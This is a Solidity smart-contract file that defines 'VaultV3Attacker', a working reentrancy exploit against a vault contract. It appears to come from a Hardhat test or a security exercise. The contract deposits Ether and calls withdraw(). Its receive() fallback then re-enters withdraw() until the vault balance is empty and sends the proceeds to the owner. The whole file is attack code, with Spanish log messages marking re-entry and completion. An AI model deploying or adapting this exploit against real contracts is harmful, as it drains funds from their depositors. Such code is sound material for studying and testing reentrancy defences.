// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IVaultV3 {
    function deposit() external payable;
    function withdraw() external;
}

contract VaultV3Attacker is Ownable {

    IVaultV3 public immutable vault;

    constructor(address vaultContractAddress) {
        vault = IVaultV3(vaultContractAddress);
    }

    function attack() external payable onlyOwner {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            console.log("Reentrando");
            vault.withdraw();
        } else {
            console.log("Ataque Terminado");
            payable(owner()).transfer(address(this).balance);
        }
    }
}
